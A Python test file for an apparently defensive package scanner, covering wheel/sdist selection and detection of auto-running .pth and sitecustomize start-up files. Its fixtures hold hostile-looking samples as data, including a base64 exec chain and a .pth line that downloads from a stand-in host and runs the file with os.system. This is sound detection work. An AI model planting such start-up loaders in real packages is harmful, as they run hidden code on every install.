"""Offline tests: which release file is chosen, and the .pth / start-up-file rule."""
import sys
import tempfile
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "guard"))
import artifact_select as A
import scan_engine as E


def f(name, size=1000, sdist=False):
    return {"filename": name, "size": size, "packagetype": "sdist" if sdist else "bdist_wheel", "url": "u/" + name}


class ChooseTests(unittest.TestCase):
    def test_compatible_wheel_beats_sdist(self):
        pure = f("x-1-py3-none-any.whl")
        pick, kind, _ = A.choose([f("x-1.tar.gz", sdist=True), pure])
        self.assertEqual((pick, kind), (pure, "wheel"))

    def test_sdist_first_policy_is_old_behaviour(self):
        sd = f("x-1.tar.gz", sdist=True)
        self.assertEqual(A.choose([sd, f("x-1-py3-none-any.whl")], A.POLICY_SDIST_FIRST)[0], sd)

    def test_no_compatible_wheel_falls_back_to_sdist(self):
        sd = f("x-1.tar.gz", sdist=True)
        self.assertEqual(A.choose([f("x-1-cp27-cp27mu-win32.whl"), sd])[:2], (sd, "sdist"))

    def test_nothing_compatible_no_sdist_takes_smallest_wheel(self):
        small = f("x-1-cp27-cp27mu-win32.whl", 10)
        self.assertEqual(A.choose([f("x-1-cp27-cp27m-win_amd64.whl", 99), small])[0], small)

    def test_empty(self):
        self.assertIsNone(A.choose([])[0])

    def test_heuristic_matches_this_interpreter(self):
        major, minor = sys.version_info[:2]
        with mock.patch.object(A, "_tag_library", lambda: None):
            self.assertIsNotNone(A.wheel_rank("x-1-py3-none-any.whl"))
            self.assertIsNone(A.wheel_rank("x-1-cp27-cp27mu-win32.whl"))
            self.assertIsNotNone(A.wheel_rank(f"x-1-cp{major}{minor}-cp{major}{minor}-manylinux_2_17_x86_64.whl")
                                 if sys.platform.startswith("linux") else 0)

    def test_compressed_tag_sets_expand(self):
        self.assertIn(("py2", "none", "any"), A.wheel_tag_combos("x-1-py2.py3-none-any.whl"))


def scan_files(tree: dict) -> E.ScanFeatures:
    ft = E.ScanFeatures(name="t", version="1")
    with tempfile.TemporaryDirectory() as d:
        root = Path(d) / "t-1-py3-none-any.whl.unpacked"
        for rel, text in tree.items():
            p = root / rel
            p.parent.mkdir(parents=True, exist_ok=True)
            p.write_text(text)
        E.static_analysis(list(root.rglob("*")), ft)
    return ft


class PthTests(unittest.TestCase):
    def test_litellm_like_chain_blocks(self):
        ft = scan_files({"evil.pth": "import base64, os; exec(base64.b64decode('cHJpbnQoMSk='))\n"})
        self.assertTrue(ft.pth_chain)
        self.assertEqual(E.compute_verdict(ft).verdict, "BLOCK")

    def test_download_execute_chain_blocks(self):
        ft = scan_files({"x.pth": "import os, urllib.request; urllib.request.urlretrieve('http://a/b','/tmp/b'); os.system('/tmp/b')\n"})
        self.assertTrue(ft.pth_chain)

    def test_risky_call_alone_is_review(self):
        ft = scan_files({"x.pth": "import subprocess; subprocess.Popen(['true'])\n"})
        self.assertTrue(ft.pth_exec and not ft.pth_chain)
        self.assertEqual(E.compute_verdict(ft).verdict, "NEEDS_HUMAN_REVIEW")

    def test_setuptools_style_pth_is_clean(self):
        ft = scan_files({"d.pth": "import os; var = 'X'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim();\n"})
        self.assertFalse(ft.pth_exec)

    def test_plain_path_lines_ignored(self):
        ft = scan_files({"p.pth": "exec(evil)  \nsubprocess\n./lib\n"})      # not starting with `import`: Python does not run them
        self.assertFalse(ft.pth_exec)

    def test_nested_pth_ignored(self):
        ft = scan_files({"pkg/x.pth": "import os; os.system('x')\n"})        # not in site-packages root
        self.assertFalse(ft.pth_exec)

    def test_root_sitecustomize_flagged_nested_not(self):
        self.assertTrue(scan_files({"sitecustomize.py": "import os\nos.system('x')\n"}).pth_exec)
        self.assertFalse(scan_files({"pkg/sitecustomize.py": "import os\nos.system('x')\n"}).pth_exec)

    def test_evidence_rule_is_reported(self):
        ft = scan_files({"evil.pth": "import base64; exec(base64.b64decode('cHJpbnQoMSk='))\n"})
        self.assertIn("pth_chain", {e["rule"] for e in ft.evidence})


if __name__ == "__main__":
    unittest.main()
